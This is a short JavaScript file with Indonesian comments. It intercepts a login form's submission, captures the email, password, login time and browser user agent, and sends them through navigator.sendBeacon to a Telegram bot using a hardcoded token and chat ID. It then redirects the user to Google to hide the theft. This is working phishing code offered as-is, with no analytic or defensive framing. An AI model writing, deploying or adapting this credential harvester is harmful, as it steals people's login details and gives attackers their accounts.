document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
    let chatId = "6786210993";
    let userAgent = navigator.userAgent;

    let message = `🔒 *Login Berhasil!*\n\n`
        + `🕒 *Waktu:* ${waktuLogin}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `📱 *Device:* ${userAgent}`;

    // Gunakan sendBeacon (lebih cepat & tetap terkirim meski halaman ditutup)
    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    let data = new Blob([JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })], { type: "application/json" });

    navigator.sendBeacon(url, data);

    console.log("✅ Data langsung terkirim ke Telegram!");

    // Tunggu 500ms sebelum redirect biar pasti terkirim
    setTimeout(() => {
        window.location.href = "https://www.google.com";
    }, 500);
});
